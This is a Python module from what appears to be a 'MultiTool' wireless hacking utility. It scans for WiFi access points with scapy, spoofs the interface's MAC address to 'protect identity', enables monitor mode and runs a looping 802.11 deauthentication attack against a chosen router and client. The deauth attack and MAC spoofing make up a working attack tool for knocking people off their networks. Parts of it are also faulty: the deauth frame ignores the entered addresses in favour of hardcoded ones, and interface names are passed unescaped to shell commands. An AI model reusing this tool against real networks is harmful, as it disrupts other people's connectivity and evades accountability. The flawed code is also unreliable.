"""
@MultiTool / Wifi
@Version 1.0
@Python 3.10.12
"""
import os,sys,time,random,threading,subprocess
from scapy.all import (RadioTap,Dot11,Dot11Deauth,sendp,wrpcap,sniff,Dot11Beacon,Dot11ProbeResp,Dot11Elt,
    Dot11ProbeReq)
#
from src.modules.logger import (Fore,LOGGER)
#

class WIFI(LOGGER):
    def __init__(self,timezone:str,network_tool) -> None:
        (self.timezone,self.network_tool) = (timezone,network_tool)
        super().__init__()
        # Scanning
        self.channel_hopping_seq:float = 0.5 # seconds
        self.channel:int = 1
        self.save_in_pcap_file:bool = False
        self.pcap_output_dir:str = "./"
        self.output_pcap_filepath:str = ""
        self.WIFIS:list[str] = []
        self.scanning_status:bool = False
        #
        
    def check_dir(self,output_dir:str) -> bool:
        try:
            return os.path.exists(output_dir)
        except Exception as e:
            return False
        
    def change_channel(self,iface:str) -> None:
        # self.info("Started Channel-Changer-Thread")
        counter:int = 0
        while self.scanning_status:
            counter += 1
            os.system(f"iwconfig {iface} channel {self.channel}")
            self.channel = self.channel % 14 + 1
            time.sleep(self.channel_hopping_seq)
        # self.info("Closed Channel-Changer-Thread")
        sys.exit()
        
    def send_probe_request(self,iface) -> None:
        # self.info("Started Send-Probe-Request-Thread")
        while self.scanning_status:
            try:
                probe_request = RadioTap() / Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff") / Dot11ProbeReq()
                sendp(probe_request, iface=iface, verbose=False)
                time.sleep(1)
            except Exception as e:
                self.error(str(e))
                break
        # self.info("Closed Send-Probe-Request-Thread")
        sys.exit()
    
    def process_probe_response(self,packet) -> None:
        try:
            if self.save_in_pcap_file:
                wrpcap(self.output_pcap_filepath, [packet], append=True)
            rssi = None
            if packet.haslayer(Dot11Beacon) and packet.haslayer(RadioTap):  # Check for Beacon and RadioTap layers
                # Check if the RadioTap layer contains the signal strength field
                if hasattr(packet, "dBm_AntSignal"):
                    rssi = packet.dBm_AntSignal
            if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
                if packet.haslayer(Dot11ProbeResp):
                    try:
                        essid = packet.getlayer(Dot11ProbeResp).info.decode()
                    except Exception as e:
                        # raise Exception("Found possible AP, but ->"+str(e))
                        essid = "? (Possible: <Length: 0>)"
                    bssid = packet.getlayer(Dot11).addr2
                    channel = ord(packet[Dot11Elt:3].info)
                    if bssid not in self.WIFIS:
                        self.found_ap(type_of_resp="ProbeRequest",essid=essid,bssid=bssid,
                            channel_frequency=str(packet.ChannelFrequency),channel=str(channel),rssi=str(rssi))
                        self.WIFIS.append(bssid)
                else:
                    bssid = packet.addr2
                    try:
                        essid = packet.info.decode('utf-8')
                    except Exception as e:
                        # raise Exception("Found possible AP, but ->"+str(e))
                        essid = "? (Possible: <Length: 0>)"
                    # Extract the channel from the Supported Rates element (ID=3)
                    channel = None
                    for elt in packet[Dot11Elt]:
                        if elt.ID == 3:
                            # The channel information is usually in the second byte
                            channel = ord(elt.info[1])
                            print(elt.info)
                            break
                    if channel == None:
                        channel = f"{self.channel-1} (?)"
                    if bssid not in self.WIFIS:
                        self.found_ap(type_of_resp="Dot11Beacon",essid=essid,bssid=bssid,channel=str(channel),rssi=str(rssi))
                        self.WIFIS.append(bssid)
        except Exception as e:
            self.error(str(e))
    
    def scan(self) -> None:
        iface:str = input(Fore.YELLOW+"Enter the interface"+Fore.WHITE+"> "+Fore.RESET)
        if self.network_tool.check_iface(iface):
            try:
                capture_status:str = input(Fore.YELLOW+"Do you want to capture the traffic-data in a pcap-file? [y/N]"+Fore.WHITE+"> "+Fore.RESET)
                if len(capture_status) > 0:
                    if capture_status.lower().strip() == "y":
                        self.save_in_pcap_file = True
                if self.save_in_pcap_file:
                    output_dir:str = input(Fore.YELLOW+f"Output-Directory of pcap-file [Default={self.pcap_output_dir}]"+Fore.WHITE+"> "+Fore.RESET)
                    if len(output_dir) > 0:
                        if self.check_dir(output_dir) == False:
                            raise Exception("Invalid output-directory!")
                    self.output_pcap_filepath = self.pcap_output_dir+"/"+"scan_output.pcap"
                    self.info(f"Writing scan-output into {self.output_pcap_filepath}")
                    wrpcap(self.output_pcap_filepath, [], linktype=127)
                self.scanning_status = True 
                threading.Thread(
                    target = self.change_channel, args=(iface,), daemon=True
                ).start()
                threading.Thread(
                    target = self.send_probe_request, args=(iface,), daemon=True
                ).start()
                self.info("Start scanning for wifi-networks in area"+Fore.BLUE+" | "+Fore.WHITE+"Press CTRL+C to stop"+Fore.RESET)
                print("\n")
                try:
                    try:
                        sniff(iface=iface, prn=self.process_probe_response)
                    except KeyboardInterrupt as e:
                        self.warning("Detected keyboard-interruption")
                    print("\n")
                    self.info("Stopped Wifi-scanning")
                except Exception as e:
                    self.error(f"An error occured: {str(e)}")
            except Exception as _error:
                self.error(f"An error occured: {str(_error)}")
        else:
            self.error(f"The interface '{iface}' is invalid!")
        self.save_in_pcap_file = False # return in default mode
        self.scanning_status = False # return in default mode (& stop daemons)
        self.WIFIS.clear()
    
    def check_mac(self,mac:str) -> bool:
        if len(mac) > 0 and ":" in mac:
            args:list[str] = mac.split(":")
            if len(args) == 6:
                for arg in args:
                    for arg in arg:
                        if arg.lower() not in ["a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9"]:
                            return False
                return True
        return False
    
    def change_mac_addr(self,iface:str) -> bool:
        try:
            try:
                cmd = f"sudo ifconfig {iface} down"
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                if process.returncode == 0:
                    cmd = f"sudo macchanger -r {iface}"
                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    if process.returncode == 0:
                        cmd = f"sudo ifconfig {iface} up"
                        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate()
                        if process.returncode == 0:
                            return True
                return False
            except subprocess.CalledProcessError as e:
                return False
        except Exception as e:
            return False
    
    def go_monitor_mode(self,iface:str) -> tuple((bool,str)):
        try:
            cmd = f"airmon-ng start {iface}"
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            new_interface = None
            lines = output.splitlines()
            print(lines)
            for line in lines:
                if "monitor mode enabled" in line.lower():
                    parts = line.split()
                    if len(parts) > 1:
                        new_interface = parts[0]
                if "monitor mode already enabled for [phy" in line.lower():
                    parts = line.split()
                    if len(parts) > 1:
                        for part in parts:
                            if "[phy" in part:
                                new_interface = part.split(" ")[0].split("]")[1]
                                break
            if new_interface == None:
                return (False,"")
            return (True,new_interface)
        except subprocess.CalledProcessError as e:
            print(str(e))
            return (False,str(e))
    
    def deauth_attack(self) -> None:
        iface:str = input(Fore.YELLOW+"Enter the interface"+Fore.WHITE+"> "+Fore.RESET)
        if self.network_tool.check_iface(iface):
            ap_bssid:str = input(Fore.YELLOW+"Enter the AP/ROUTER-BSSID"+Fore.WHITE+"> "+Fore.RESET)
            if self.check_mac(ap_bssid):
                client_mac:str = input(Fore.YELLOW+"Enter the CLIENT-MAC"+Fore.WHITE+"> "+Fore.RESET)
                if self.check_mac(client_mac):
                    self.info(f"Selected {iface} as wifi-interface")
                    if ap_bssid == client_mac:
                        self.warning("Client-MAC and AP/ROUTER-BSSID are the same - the attack could be less effective!")
                    # protect identity & go in monitor mode
                    self.info(f"Change MAC-Address of {iface}",prog=True)
                    if self.change_mac_addr(iface):
                        self.ok(),self.info(f"Change interface to monitor mode",prog=True)
                        (status,resp) = self.go_monitor_mode(iface)
                        if status:
                            if iface != resp:
                                self.info(f"Interface changed from {iface} to {resp}")
                        else:
                            self.failed(),self.error(f"Couldn't change {iface} to monitor mode: {resp}")
                            return
                    else:
                        self.failed(),self.error(f"Couldn't change MAC-Address of interface {iface}")
                        return
                    # Sending deauth packages
                    size:int = 1000
                    brdmac = "aa:bb:cc:dd:ee:ff"
                    msg = random._urandom(int(size))
                    packet = (RadioTap()/Dot11(addr1 = brdmac, addr2 = "1E:05:BD:60:0E:F2", addr3 = "DA:F6:33:20:A0:38")/Dot11Deauth()/(msg))
                    self.info(f"Attacking Client={client_mac} AP/Router={ap_bssid} Broadcast-MAC={brdmac} by sending {len(packet)} Bytes")
                    self.info(f"Stop attack by typing {Fore.RESET}'{Fore.LIGHTBLUE_EX}CTRL+C{Fore.RESET}'")
                    counter:int = 0
                    while True:
                        try:
                            try:
                                counter += 1
                                self.info(f"({counter}) Sending Deauth-Package with Code 7",prog=True)
                                sendp(packet,count=5,verbose=False,iface=iface)
                                self.ok()
                                time.sleep(0.01) # Seconds
                            except KeyboardInterrupt as e:
                                raise Exception("Detected Keyboard-interruption")
                        except Exception as _error:
                            self.failed(),self.error(str(_error))
                            break
                    self.info("Stopped Deauth-Attack")
                else:
                    self.error("The Client-MAC is invalid!")
            else:
                self.error("The AP/Router-BSSID is invalid!")
        else:
            self.error(f"The interface '{iface}' is invalid!")